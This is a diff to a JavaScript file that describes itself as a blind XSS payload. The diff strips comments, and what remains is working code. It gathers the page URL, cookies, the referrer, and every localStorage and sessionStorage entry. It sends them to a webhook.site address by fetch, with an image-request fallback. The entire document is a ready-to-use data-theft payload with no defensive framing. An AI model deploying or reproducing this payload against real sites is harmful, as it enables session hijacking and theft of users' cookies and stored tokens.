@@ -1,7 +1,7 @@
 
 console.log("Blind XSS payload executed!");
 
-// Collect all available data
+
 const extractedData = {
     timestamp: new Date().toISOString(),
     url: window.location.href,
@@ -10,12 +10,12 @@ const extractedData = {
     cookies: document.cookie,
     referrer: document.referrer,
     
-    // Extract localStorage
+
     localStorage: {},
     sessionStorage: {}
 };
 
-// Get all localStorage items
+
 try {
     for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
@@ -25,7 +25,7 @@ try {
     extractedData.localStorage = "Access denied or not available";
 }
 
-// Get all sessionStorage items  
+
 try {
     for (let i = 0; i < sessionStorage.length; i++) {
         const key = sessionStorage.key(i);
@@ -35,8 +35,7 @@ try {
     extractedData.sessionStorage = "Access denied or not available";
 }
 
-// Send data to your webhook - REPLACE THIS URL IN STEP 2
-// Send data to your webhook
+
 fetch('https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa', {
     method: 'POST',
     headers: {
@@ -45,7 +44,7 @@ fetch('https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa', {
     body: JSON.stringify(extractedData),
     mode: 'no-cors'
 }).catch(error => {
-    // Fallback method using image request - SAME BASE URL
+  
     const img = new Image();
     img.src = 'https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa?data=' + encodeURIComponent(JSON.stringify(extractedData));
 });
